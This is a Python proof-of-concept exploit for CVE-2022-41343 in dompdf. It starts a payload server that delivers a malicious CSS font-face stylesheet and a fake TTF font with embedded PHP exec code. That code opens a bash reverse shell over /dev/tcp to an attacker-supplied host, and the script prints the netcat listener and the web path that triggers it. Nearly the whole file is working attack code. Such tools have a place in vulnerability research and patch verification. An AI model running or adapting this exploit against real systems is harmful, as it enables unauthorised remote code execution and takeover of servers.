import argparse
import hashlib
import rich
import socketserver
import sys
from functools import partial
from http.server import SimpleHTTPRequestHandler

ASCII_ART = """

░█████╗░██╗░░░██╗███████╗░░░░░░██████╗░░█████╗░██████╗░██████╗░░░░░░░░░██╗██╗░░███╗░░██████╗░░░██╗██╗██████╗░
██╔══██╗██║░░░██║██╔════╝░░░░░░╚════██╗██╔══██╗╚════██╗╚════██╗░░░░░░░██╔╝██║░████║░░╚════██╗░██╔╝██║╚════██╗
██║░░╚═╝╚██╗░██╔╝█████╗░░█████╗░░███╔═╝██║░░██║░░███╔═╝░░███╔═╝█████╗██╔╝░██║██╔██║░░░█████╔╝██╔╝░██║░█████╔╝
██║░░██╗░╚████╔╝░██╔══╝░░╚════╝██╔══╝░░██║░░██║██╔══╝░░██╔══╝░░╚════╝███████║╚═╝██║░░░╚═══██╗███████║░╚═══██╗
╚█████╔╝░░╚██╔╝░░███████╗░░░░░░███████╗╚█████╔╝███████╗███████╗░░░░░░╚════██║███████╗██████╔╝╚════██║██████╔╝
░╚════╝░░░░╚═╝░░░╚══════╝░░░░░░╚══════╝░╚════╝░╚══════╝╚══════╝░░░░░░░░░░░╚═╝╚══════╝╚═════╝░░░░░░╚═╝╚═════╝░
PoC for [bold yellow]CVE-2022-41343[/bold yellow] - dompdf Version < [bold yellow]2.0.1[/bold yellow]
"""

# TTF Header based off: https://github.com/positive-security/dompdf-rce/blob/main/exploit/exploit_font.php
TTF_BYTES = b"\x00\x01\x00\x00\x00\x0A\x00\xEF\xBF\xBD\x00\x03\x00\x20\x64\x75\x6D\x31\x00\x00\x00\x00\x00\x00" \
            b"\x00\xEF\xBF\xBD\x00\x00\x00\x02\x63\x6D\x61\x70\x00\x0C\x00\x60\x00\x00\x00\xEF\xBF\xBD\x00\x00" \
            b"\x00\x2C\x67\x6C\x79\x66\x35\x73\x63\xEF\xBF\xBD\x00\x00\x00\xEF\xBF\xBD\x00\x00\x00\x14\x68\x65" \
            b"\x61\x64\x07\xEF\xBF\xBD\x51\x36\x00\x00\x00\xEF\xBF\xBD\x00\x00\x00\x36\x68\x68\x65\x61\x00\xEF" \
            b"\xBF\xBD\x03\xEF\xBF\xBD\x00\x00\x01\x28\x00\x00\x00\x24\x68\x6D\x74\x78\x04\x44\x00\x0A\x00\x00" \
            b"\x01\x4C\x00\x00\x00\x08\x6C\x6F\x63\x61\x00\x0A\x00\x00\x00\x00\x01\x54\x00\x00\x00\x06\x6D\x61" \
            b"\x78\x70\x00\x04\x00\x03\x00\x00\x01\x5C\x00\x00\x00\x20\x6E\x61\x6D\x65\x00\x44\x10\xEF\xBF\xBD" \
            b"\x00\x00\x01\x7C\x00\x00\x00\x38\x64\x75\x6D\x32\x00\x00\x00\x00\x00\x00\x01\xEF\xBF\xBD\x00\x00" \
            b"\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x03\x00\x01\x00\x00\x00\x0C\x00\x04\x00\x20\x00\x00" \
            b"\x00\x04\x00\x04\x00\x01\x00\x00\x00\x2D\xEF\xBF\xBD\xEF\xBF\xBD\x00\x00\x00\x2D\xEF\xBF\xBD\xEF" \
            b"\xBF\xBD\xEF\xBF\xBD\xEF\xBF\xBD\x00\x01\x00\x00\x00\x00\x00\x01\x00\x0A\x00\x00\x00\x3A\x00\x38" \
            b"\x00\x02\x00\x00\x33\x23\x35\x3A\x30\x38\x00\x01\x00\x00\x00\x01\x00\x00\x17\xEF\xBF\xBD\xEF\xBF" \
            b"\xBD\x16\x5F\x0F\x3C\xEF\xBF\xBD\x00\x0B\x00\x40\x00\x00\x00\x00\xEF\xBF\xBD\x15\x38\x06\x00\x00" \
            b"\x00\x00\xEF\xBF\xBD\x26\xDB\xBD\x00\x0A\x00\x00\x00\x3A\x00\x38\x00\x00\x00\x06\x00\x01\x00\x00" \
            b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x4C\xEF\xBF\xBD\xEF\xBF\xBD\x00\x12\x04\x00\x00\x0A\x00\x0A" \
            b"\x00\x3A\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x04\x00\x00\x00" \
            b"\x00\x44\x00\x0A\x00\x00\x00\x00\x00\x0A\x00\x00\x00\x01\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00" \
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04" \
            b"\x00\x36\x00\x03\x00\x01\x04\x09\x00\x01\x00\x02\x00\x00\x00\x03\x00\x01\x04\x09\x00\x02\x00\x02" \
            b"\x00\x00\x00\x03\x00\x01\x04\x09\x00\x03\x00\x02\x00\x00\x00\x03\x00\x01\x04\x09\x00\x04\x00\x02" \
            b"\x00\x00\x00\x73\x00\x00\x00\x00\x0A"

CSS_LINK_FMT = "<link rel=stylesheet href='http://{ip}:{port}/{font_name}.css'>"

PHP_URL_FMT = "http://{ip}:{port}/{font_name}.php"

CSS_FMT = """@font-face {{
    font-family:'{font_name}';
    src:url('{php_url}');
    font-weight:'normal';
    font-style:'normal';
}}
"""

REVERSE_SHELL_FMT = "{shell} -c '{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'"
PHP_PAYLOAD_FMT = '<?php exec("{payload}")?>'

PATH_FMT = "dompdf/dompdf/lib/fonts/{font_name}_normal_{md5}.php"

# ---------------------------------------------------------------------------------------------------------------------
class PayloadHandler(SimpleHTTPRequestHandler):
    # -----------------------------------------------------------------------------------------------------------------
    def __init__(self, css_payload: str, ttf_payload: str, *args, **kwargs):
        self.css_payload = css_payload
        self.ttf_payload = ttf_payload
        super().__init__(*args, **kwargs)

    # -----------------------------------------------------------------------------------------------------------------
    def do_GET(self):
        do_exit = False
        payload = b""
        code = 200
        if self.path.lower().endswith(".css"):
            success("Got Stage 1 Request. Sent CSS Payload 📎")
            payload = self.css_payload
        elif self.path.lower().endswith(".php"):
            success("Got Stage 2 Request. Sent TTF Payload 🏴‍☠️")
            payload = self.ttf_payload
            do_exit = True
        else:
            rich.print(f"[bold yellow]Got Unknown Request: {self.path}[/bold yellow]")
            code = 404
        
        self.send_response(code)
        self.end_headers()
        self.wfile.write(payload)
        if do_exit:
            sys.exit(0)

    # -----------------------------------------------------------------------------------------------------------------
    def log_message(self, format, *args):
        pass

# ---------------------------------------------------------------------------------------------------------------------
def error(txt: str):
    rich.print(f"[red][-] Error: [/red]{txt}")
    sys.exit(1)

# ---------------------------------------------------------------------------------------------------------------------
def status(txt: str, prefix=""):
    rich.print(prefix + f"[blue][*][/blue] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def success(txt: str, prefix=""):
    rich.print(prefix + f"[green][+][/green] {txt}")

# ---------------------------------------------------------------------------------------------------------------------
def cli():
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Shell Callback IP Address/Host")
    parser.add_argument('port', type=int, help="Shell Callback Port")
    parser.add_argument('-l', '--listen', dest="server_port", help="Server Listening Port (default: 55555)", default=55555)
    parser.add_argument('-s', '--shell', default="bash", help="Remote Shell (default: bash)")
    parser.add_argument('-n', '--font-name', default="comicsploitz", help="Exploit Font Name (default: comicsploitz)")
    args = parser.parse_args()
    rich.print(ASCII_ART)

    status("CSS Payload...")
    css_link = CSS_LINK_FMT.format(ip=args.ip, port=args.server_port, font_name=args.font_name)
    php_url = PHP_URL_FMT.format(ip=args.ip, port=args.server_port, font_name=args.font_name)
    php_url_md5 = hashlib.md5(php_url.encode()).digest().hex()
    css_payload = CSS_FMT.format(font_name=args.font_name, php_url=php_url)
    for line in css_payload.splitlines():
        rich.print(f"\t{line}")
    
    rev_shell = REVERSE_SHELL_FMT.format(shell=args.shell, ip=args.ip, port=args.port)
    payload = PHP_PAYLOAD_FMT.format(payload=rev_shell)

    ttf_payload = TTF_BYTES + payload.encode()
    web_path = PATH_FMT.format(font_name=args.font_name, md5=php_url_md5).lower()
    print()
    status(f"TTF Payload : <TTF Header> + {payload}")
    status(f"CSS Link    : [bold yellow]{css_link}[/bold yellow]")
    status(f"Listener    : [bold cyan]nc -nvlp {args.port}[/bold cyan]")
    status(f"Web Path    : [bold purple4]{web_path}[/bold purple4]\n")

    try:
        handler = partial(PayloadHandler, css_payload.encode(), ttf_payload)
        with socketserver.TCPServer(("", args.server_port), handler) as httpd:    
            status(f"Server Started on {args.server_port} (Ctrl+C to stop)\n")
            httpd.serve_forever()
    except KeyboardInterrupt:
        status("Quitting...")
        sys.exit(0)
    except Exception as e:
        error(f"Exception: {e}")

# ---------------------------------------------------------------------------------------------------------------------
if __name__ == '__main__':
    cli()
